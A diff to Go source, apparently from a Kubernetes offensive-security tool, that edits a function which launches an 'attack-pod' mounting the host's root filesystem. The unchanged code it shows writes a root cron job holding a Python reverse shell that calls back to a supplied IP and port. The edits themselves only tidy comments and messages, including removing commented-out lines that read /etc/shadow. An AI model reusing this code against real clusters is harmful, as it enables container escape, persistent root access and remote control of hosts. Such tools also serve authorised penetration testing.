@@ -566,8 +566,6 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 	// TODO: changing parsing to occur via JSON
 	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image
 
-	// TODO: Create approach 2
-
 	// Approach 1: Try to get the image file for my own pod
 	//./kubectl describe pod `hostname`| grep Image:
 	hostname := os.Getenv("HOSTNAME")
@@ -584,7 +582,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 			if start != -1 {
 				// Found an Image line -- now get the image
 				image = strings.TrimSpace(line[start+6:])
-				println("[+] Found image :", image)
+				println("[+] Using your current pod's image:", image)
 				approach1Success = true
 
 				MountInfoVars.image = image
@@ -595,15 +593,13 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 		}
 	}
 
-	if approach1Success {
-		println("[+] Got image definition from own pod.")
-	} else {
+	if !approach1Success {
 		// Approach 2 - use the most recently staged running pod
 		//
 		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.
 
 		// Future version of approach 2:
-		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
+		// 	Let's make something to mount the root filesystem, but not pick the most recent one.  Rather,
 		// it should populate a list of all pods in the current namespace, then iterate through
 		// images trying to find one that has a shell.
 
@@ -622,7 +618,7 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 		println("Getting image from the most recently-staged pod in thie namespace")
 		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
 		if err != nil {
-			//log.Fatal(err)
+			// If this fails, just go back to the menu.
 			println("[-] ERROR: Could not get pods")
 			return
 		}
@@ -632,7 +628,6 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 			if err != nil {
 				println("[-] ERROR: could not parse pod list")
 				return
-				// log.Fatal(err)
 			}
 			if !matched {
 				//added checking to only enumerate running pods
@@ -642,11 +637,11 @@ func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP
 		}
 	}
 
-	//creat random string
+	//create random string
 	rand.Seed(time.Now().UnixNano())
 	randomString := randSeq(6)
 
-	// Create Yaml File
+	// Create pod manifest in YAML
 	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
 kind: Pod
 metadata:
@@ -681,8 +676,6 @@ spec:
 		attackPodName := "attack-pod-" + randomString
 		println("[+] Executing code in " + attackPodName + " - please wait for Pod to stage")
 		time.Sleep(5 * time.Second)
-		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
-		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
 		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
 		stdout := bytes.Buffer{}
 		stderr := bytes.Buffer{}
@@ -694,21 +687,14 @@ spec:
 			return
 		} else {
 			println("[+] Netcat callback added sucessfully.")
-			//println(string(shadowFileBs))
 		}
 	}
-	//out, err = exec.Command("").Output()
-	//if err != nil {
-	//	println("Token location error: ", err)
-	//}
-	//println(out)
 }
 
 func clearScreen() {
 	fmt.Print("Press Enter to Proceed .....")
 	var input string
 	fmt.Scanln(&input)
-	//fmt.Print(input)
 	c := exec.Command("clear")
 	c.Stdout = os.Stdout
 	c.Run()
